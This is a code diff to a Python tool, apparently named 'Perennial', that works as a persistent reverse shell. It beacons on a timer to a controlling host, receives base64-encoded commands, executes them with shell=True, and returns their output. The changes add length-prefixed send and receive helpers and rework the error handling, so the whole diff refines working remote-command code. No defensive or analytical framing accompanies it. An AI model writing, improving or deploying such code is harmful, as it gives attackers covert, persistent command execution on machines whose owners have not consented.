@@ -42,8 +42,7 @@ def ctrl_shell_client(host, port):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
     while True:
-        inp = s.recv(SIZE)
-        inp = base64.b64decode(inp)
+        inp = base64.b64decode(sockrecv(s))
         if inp == 'fin':
             break
         elif re.search('^exec (".+"\ )+$', inp + ' '):
@@ -55,10 +54,51 @@ def ctrl_shell_exec(s, inp):
     stdout = ''
     cmds = parse_exec_cmds(inp)
     for cmd in cmds:
-        stdout += '==========\n\n$ {}\n'.format(cmd)
-        stdout += sp.Popen(cmd, stdout=sp.PIPE, shell=True).communicate()[0]
-    stdout = base64.b64encode(stdout)
-    s.send(stdout)
+        cmd_out = sp.Popen(cmd, stdout=sp.PIPE, shell=True).communicate()[0]
+        stdout += '==========\n\n$ {}\n{}\n'.format(cmd, cmd_out)
+    socksend(s, stdout)
+
+
+def socksend(s, msg):
+    """
+        Sends message using socket operating under the convention that the
+        first five bytes received are the size of the following message.
+    """
+
+    pkg = base64.b64encode(msg)
+    pkg_size = '{:0>5d}'.format((len(pkg)))
+    pkg = pkg_size + pkg
+    sent = s.sendall(pkg)
+    if sent:
+        raise socket.error('socket connection broken')
+
+
+def sockrecv(s):
+    """
+        Receives message from socket operating under the convention that the
+        first five bytes received are the size of the following message.
+        Returns the message.
+
+        TODO: Under high network loads, it's possible that the initial recv
+        may not even return the first 5 bytes so another loop is necessary
+        to ascertain that.
+    """
+
+    chunks = []
+    bytes_recvd = 0
+    initial = s.recv(SIZE)
+    if not initial:
+        raise socket.error('socket connection broken')
+    msglen, initial = (int(initial[:5]), initial[5:])
+    bytes_recvd = len(initial)
+    chunks.append(initial)
+    while bytes_recvd < msglen:
+        chunk = s.recv(min((msglen - bytes_recvd, SIZE)))
+        if not chunk:
+            raise socket.error('socket connection broken')
+        chunks.append(chunk)
+        bytes_recvd += len(chunk)
+    return ''.join(chunks)
 
 
 def parse_exec_cmds(inp):
@@ -89,17 +129,20 @@ def main():
     log.info(('[+] Perennial started with delay of {} seconds to port {}.' +
               ' Ctrl-c to exit.').format(DELAY, PORT))
 
-    while True:
-        try:
+    try:
+        while True:
             if is_active(HOST, PORT):
                 log.info('[+] ({}) Server is active'.format(datetime.now()))
                 ctrl_shell_client(HOST, PORT)
             else:
                 log.info('[!] ({}) Server is inactive'.format(datetime.now()))
             time.sleep(DELAY)
-        except KeyboardInterrupt:
-            log.info('[-] Perennial terminated.')
-            sys.exit(0)
+    except KeyboardInterrupt:
+        log.info('[-] ({}) Perennial terminated.'.format(datetime.now()))
+    except socket.error:
+        log.info('[!] ({}) Socket error.'.format(datetime.now()))
+        log.info('[-] ({}) Perennial terminated.'.format(datetime.now()))
+        sys.exit(0)
 
 if __name__ == '__main__':
     main()
